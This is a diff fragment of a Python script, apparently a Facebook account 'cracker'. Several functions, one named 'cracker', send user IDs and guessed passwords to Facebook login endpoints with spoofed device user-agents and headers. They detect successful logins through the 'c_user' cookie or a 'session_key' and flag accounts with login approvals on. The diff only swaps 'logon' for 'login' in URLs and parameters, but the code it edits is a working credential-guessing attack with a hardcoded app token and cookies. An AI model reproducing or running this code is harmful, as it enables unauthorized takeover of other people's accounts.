[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
-    ua = a+b+c+d
-    return ua
-
 def mbasic(uid,pwx,tl):
     global oks
     global cps
@@ -1258,7 +1260,7 @@ def mbasic(uid,pwx,tl):
             'display': '',
             'isprivate': '',
             'return_session': '',
-            'skip_api_logon': '',
+            'skip_api_login': '',
             'signed_next': '',
             'trynum': '1',
             'timezone': '-330',
@@ -1293,7 +1295,7 @@ def mbasic(uid,pwx,tl):
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://hi-in.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://hi-in.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=120&lwc=1348092',
+            'referer': 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -1303,8 +1305,8 @@ def mbasic(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',}
-            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://hi-in.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=100'
+            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1361,7 +1363,7 @@ def p(uid,pwx,tl):
             'locale': 'en_US',
             'client_country_code': 'US',
             'cpl': 'true',
-            'source': 'logon',
+            'source': 'login',
             'format': 'json',
             'omit_response_on_success': 'false',
             'credentials_type': 'password',
@@ -1372,7 +1374,7 @@ def p(uid,pwx,tl):
             'tier': 'regular',
             'currently_logged_in_userid': '0',
             'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.logon.protocol.Fb4aAuthHandler',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
             'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
             'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
             'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
@@ -1395,7 +1397,7 @@ def p(uid,pwx,tl):
             'X-FB-Friendly-Name': 'authenticate',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': '1026'}
-            url = "https://graph.facebook.com/auth/logon"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).text
             print(result)
             if "session_key" in result:
@@ -1462,7 +1464,7 @@ def x(uid,pwx,tl):
             'wd': '393x895',
             'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
             params = {
-            'appid': 'com.bloks.www.bloks.caa.logon.async.send_logon_request',
+            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
             'type': 'action',
             '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
@@ -1486,14 +1488,14 @@ def x(uid,pwx,tl):
                 "credential_type": "password",
                 "username_text_input_id": "7w9omu:68",
                 "password_text_input_id": "7w9omu:69",
-                "logon_source": "logon",
-                "logon_credential_type": "none",
-                "server_logon_source": "logon",
-                "ar_event_source": "logon_home_page",
-                "should_trigger_override_logon_success_action": 0,
-                "should_trigger_override_logon_2fa_action": 0,
+                "login_source": "login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_override_login_2fa_action": 0,
                 "is_caa_perf_enabled": 0,
-                "reg_flow_source": "logon_home_native_integration_point",
+                "reg_flow_source": "login_home_native_integration_point",
                 "caller": "gslr",
                 "is_from_landing_page": 0,
                 "is_from_empty_password": 0,
@@ -1501,7 +1503,7 @@ def x(uid,pwx,tl):
                 "is_from_password_entry_page": 0,
                 "is_from_assistive_id": 0,
                 "is_from_msplit_fallback": 0,
-                "two_step_logon_type": "one_step_logon",
+                "two_step_login_type": "one_step_login",
                 "INTERNAL__latency_qpl_marker_id": 36707139,
                 "INTERNAL__latency_qpl_instance_id": "47746277400427",
                 "device_id": None,
@@ -1509,7 +1511,7 @@ def x(uid,pwx,tl):
                 "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
-                "is_platform_logon": 0,
+                "is_platform_login": 0,
                 "is_from_logged_in_switcher": 0,
                 "is_from_logged_out": 0,
                 "access_flow_version": "pre_mt_behavior"
@@ -1525,8 +1527,8 @@ def x(uid,pwx,tl):
                 "encrypted_msisdn": "",
                 "headers_infra_flow_id": "",
                 "try_num": 1,
-                "logon_attempt_count": 1,
-                "event_flow": "logon_manual",
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
                 "event_step": "home_page",
                 "openid_tokens": {},
                 "block_store_machine_id": "",
@@ -1550,7 +1552,7 @@ def x(uid,pwx,tl):
             headers = {
             'Host': 'm.facebook.com',
             'method': 'POST',
-            'path': '/logon/Device-based/logon/async/',
+            'path': '/login/Device-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -1569,7 +1571,7 @@ def x(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'dnt': '1',
             'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/logon.php?skip_api_logon=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fblogonKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fblogonReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogon%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fblogonKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fblogonReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbloginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbloginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbloginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbloginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
             'x-requested-with': 'mark.via.gp',
             'sec-fetch-site': 'none',
             'sec-fetch-mode': 'navigate',
@@ -1577,7 +1579,7 @@ def x(uid,pwx,tl):
             'sec-fetch-dest': 'document',
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
-            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
@@ -1666,11 +1668,11 @@ def mobile(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://hi-in.facebook.com/logon/?next&ref=dbl&fl&logon_from_aymh=1&refid=8',
+            'referer': 'https://hi-in.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://hi-in.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=100"
+            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = "https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1774,8 +1776,8 @@ def freeq(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
             'viewport-width': '885',}
-            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=110'
+            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1842,7 +1844,7 @@ def d(uid,pwx,tl):
             'wd': '393x895',
             'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
             params = {
-            'appid': 'com.bloks.www.bloks.caa.logon.async.send_logon_request',
+            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
             'type': 'action',
             '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
@@ -1866,14 +1868,14 @@ def d(uid,pwx,tl):
                 "credential_type": "password",
                 "username_text_input_id": "7w9omu:68",
                 "password_text_input_id": "7w9omu:69",
-                "logon_source": "logon",
-                "logon_credential_type": "none",
-                "server_logon_source": "logon",
-                "ar_event_source": "logon_home_page",
-                "should_trigger_override_logon_success_action": 0,
-                "should_trigger_override_logon_2fa_action": 0,
+                "login_source": "login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_override_login_2fa_action": 0,
                 "is_caa_perf_enabled": 0,
-                "reg_flow_source": "logon_home_native_integration_point",
+                "reg_flow_source": "login_home_native_integration_point",
                 "caller": "gslr",
                 "is_from_landing_page": 0,
                 "is_from_empty_password": 0,
@@ -1881,7 +1883,7 @@ def d(uid,pwx,tl):
                 "is_from_password_entry_page": 0,
                 "is_from_assistive_id": 0,
                 "is_from_msplit_fallback": 0,
-                "two_step_logon_type": "one_step_logon",
+                "two_step_login_type": "one_step_login",
                 "INTERNAL__latency_qpl_marker_id": 36707139,
                 "INTERNAL__latency_qpl_instance_id": "47746277400427",
                 "device_id": None,
@@ -1889,7 +1891,7 @@ def d(uid,pwx,tl):
                 "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
-                "is_platform_logon": 0,
+                "is_platform_login": 0,
                 "is_from_logged_in_switcher": 0,
                 "is_from_logged_out": 0,
                 "access_flow_version": "pre_mt_behavior"
@@ -1905,8 +1907,8 @@ def d(uid,pwx,tl):
                 "encrypted_msisdn": "",
                 "headers_infra_flow_id": "",
                 "try_num": 1,
-                "logon_attempt_count": 1,
-                "event_flow": "logon_manual",
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
                 "event_step": "home_page",
                 "openid_tokens": {},
                 "block_store_machine_id": "",
@@ -1947,10 +1949,10 @@ def d(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://mtouch.facebook.com/logon/?next&ref=dbl&fl&logon_from_aymh=1&refid=8',
+            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://p.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
@@ -2031,7 +2033,7 @@ def cracker(uid, pwx, tl):
             'wd': '393x895',
             'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
             params = {
-            'appid': 'com.bloks.www.bloks.caa.logon.async.send_logon_request',
+            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
             'type': 'action',
             '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
@@ -2055,14 +2057,14 @@ def cracker(uid, pwx, tl):
                 "credential_type": "password",
                 "username_text_input_id": "7w9omu:68",
                 "password_text_input_id": "7w9omu:69",
-                "logon_source": "logon",
-                "logon_credential_type": "none",
-                "server_logon_source": "logon",
-                "ar_event_source": "logon_home_page",
-                "should_trigger_override_logon_success_action": 0,
-                "should_trigger_override_logon_2fa_action": 0,
+                "login_source": "login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_override_login_2fa_action": 0,
                 "is_caa_perf_enabled": 0,
-                "reg_flow_source": "logon_home_native_integration_point",
+                "reg_flow_source": "login_home_native_integration_point",
                 "caller": "gslr",
                 "is_from_landing_page": 0,
                 "is_from_empty_password": 0,
@@ -2070,7 +2072,7 @@ def cracker(uid, pwx, tl):
                 "is_from_password_entry_page": 0,
                 "is_from_assistive_id": 0,
                 "is_from_msplit_fallback": 0,
-                "two_step_logon_type": "one_step_logon",
+                "two_step_login_type": "one_step_login",
                 "INTERNAL__latency_qpl_marker_id": 36707139,
                 "INTERNAL__latency_qpl_instance_id": "47746277400427",
                 "device_id": None,
@@ -2078,7 +2080,7 @@ def cracker(uid, pwx, tl):
                 "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
-                "is_platform_logon": 0,
+                "is_platform_login": 0,
                 "is_from_logged_in_switcher": 0,
                 "is_from_logged_out": 0,
                 "access_flow_version": "pre_mt_behavior"
@@ -2094,8 +2096,8 @@ def cracker(uid, pwx, tl):
                 "encrypted_msisdn": "",
                 "headers_infra_flow_id": "",
                 "try_num": 1,
-                "logon_attempt_count": 1,
-                "event_flow": "logon_manual",
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
                 "event_step": "home_page",
                 "openid_tokens": {},
                 "block_store_machine_id": "",
@@ -2136,10 +2138,10 @@ def cracker(uid, pwx, tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://mbasic.facebook.com/logon/?next&ref=dbl&fl&logon_from_aymh=1&refid=8',
+            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
